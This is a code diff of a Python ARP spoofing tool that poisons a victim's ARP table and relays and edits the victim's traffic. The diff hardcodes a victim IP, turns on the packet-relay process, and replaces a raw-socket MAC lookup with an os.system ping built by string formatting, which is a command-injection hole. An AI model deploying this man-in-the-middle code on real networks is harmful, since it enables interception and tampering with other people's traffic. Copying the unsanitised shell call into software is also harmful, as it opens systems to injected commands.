@@ -1,3 +1,4 @@
+# coding=utf-8
 # https://github.com/Kcrong/python-send-arp/blob/master/main.py
 """
 Writer Kcrong
@@ -5,6 +6,7 @@ Writer Kcrong
 python3 main.py [victim ip]
 """
 
+import os
 import re
 import subprocess
 import time
@@ -15,11 +17,13 @@ from socket import *
 from struct import unpack
 from sys import argv
 
+from cleaner import error_clean
+
 from packet_header_define import *
 
 
 class ARP:
-
+    @error_clean
     def run(self):
         while True:
             self.send_arp(ARP_REPLY_OP)
@@ -85,9 +89,11 @@ class ARP:
 
         :return: ip address that connect with victim
         """
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            s.connect((self.victim_ip, 219))  # 219 is ARP port
-            my_ip = s.getsockname()[0]
+
+        s = socket(AF_INET, SOCK_DGRAM)
+        s.connect((self.victim_ip, 219))  # 219 is ARP port
+        my_ip = s.getsockname()[0]
+        s.close()
 
         name, mac = self._get_interface_info(my_ip)
 
@@ -104,21 +110,21 @@ class ARP:
 
         self.send_arp(ARP_REQUEST_OP)
 
-        with socket(AF_PACKET, SOCK_RAW, htons(0x0003)) as s:
-            s.bind((self.name, SOCK_RAW))
-            while True:
-                if len(time_list) == 2:
-                    break
-                ether, ip = self.get_headers(s.recvfrom(4096))
+        s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+        s.bind((self.name, SOCK_RAW))
+        while True:
+            if len(time_list) == 2:
+                break
+            ether, ip = self.get_headers(s.recvfrom(4096))
 
-                ip_data = self.analysis_header(ip)
+            ip_data = self.analysis_header(ip)
 
-                # if not ARP, Go away
-                if ether[2] != ARP_TYPE_ETHERNET_PROTOCOL:
-                    continue
+            # if not ARP, Go away
+            if ether[2] != ARP_TYPE_ETHERNET_PROTOCOL:
+                continue
 
-                elif ip_data['src_ip'] == self.victim_ip and ip_data['dst_ip'] == self.gateway_ip:
-                    time_list.append(time.time())
+            elif ip_data['src_ip'] == self.victim_ip and ip_data['dst_ip'] == self.gateway_ip:
+                time_list.append(time.time())
 
         # After get time
         return time_list[1] - time_list[0]
@@ -155,9 +161,9 @@ class ARP:
         for name, ip_addr in interfaces:
             if ip == ip_addr:
                 # 구한 Interface 이름을 이용해 MAC 주소를 raw socket 을 이용해 convert 된 값을 가져옴
-                with socket(AF_PACKET, SOCK_RAW, SOCK_RAW) as s:
-                    s.bind((name, SOCK_RAW))
-                    return name, s.getsockname()[4]
+                s = socket(AF_PACKET, SOCK_RAW, SOCK_RAW)
+                s.bind((name, SOCK_RAW))
+                return name, s.getsockname()[4]
 
         # 해당 아이피를 가진 인터페이스가 없으면 False 반환
         return False
@@ -242,13 +248,17 @@ class ARP:
         s.send(b''.join(packet_frame))
         s.close()
 
-    def _get_mac(self, target_ip):
+    @staticmethod
+    def _get_mac(target_ip):
         """
-        target_ip 의 Reply packet 을 확인하여 mac 주소를 반환합니다.
+        target_ip 의 mac 주소를 반환합니다.
         :param target_ip: target's ip address
         :return: target's mac address
         """
 
+        # 개선 전 코드
+
+        """
         s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
 
         while True:
@@ -264,6 +274,17 @@ class ARP:
 
             elif src_ip == target_ip:
                 return mac
+        """
+
+        # 개선 후 코드
+
+        os.system('ping -c 1 %s' % target_ip)
+
+        output = popen('arp -a').read()
+        for host in output.split('\n'):
+            ip = host.split()[1][1:-1]
+            if ip == target_ip:
+                return host.split()[3]
 
 
 class Relay:
@@ -280,8 +301,8 @@ class Relay:
         멀티 프로세스 환경으로 동작
         :return: None (Demon)
         """
-        p = Process(target=self.relay, args=())
-        p.start()
+        process = Process(target=self.relay, args=())
+        process.start()
 
     def edit_packet(self, packet):
         """
@@ -336,11 +357,12 @@ class Relay:
 
 def main():
     # victim_ip = input("Victim IP: ")
-    arp = ARP(victim=argv[1])
+    # arp = ARP(victim=argv[1])
+    arp = ARP(victim='192.168.1.16')
 
     # 리눅스 상의 Relay를 사용하므로,
-    # r = Relay(arp)
-    # r.run()
+    r = Relay(arp)
+    r.run()
 
     # target에 변조된 ARP 패킷을 보냄
     # target의 arp-table 을 변조
